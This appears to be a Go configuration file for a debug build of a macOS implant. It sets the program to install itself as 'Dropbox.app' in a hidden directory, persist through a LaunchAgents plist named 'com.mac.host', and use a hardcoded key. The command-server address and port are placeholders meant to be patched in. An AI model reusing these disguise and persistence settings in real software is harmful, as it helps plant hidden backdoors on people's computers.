//+build debug

package config

import "strings"

const(
  Key             string  = "ju5T4K3Yd0nTc4t3"
  DEBUG           bool    = true
  TargetDir       string  = "/.default"
  TargetName      string  = "Dropbox.app"
  PlistDir        string  = "/Library/LaunchAgents"
  PlistName       string  = "com.mac.host"
)

var(
  ServerIP        string  = strings.TrimRight("XXXXXXXXXXXXXXX", "\x00")
  ServerPort      string  = ":" + strings.TrimRight("OOOOO", "\x00")
)
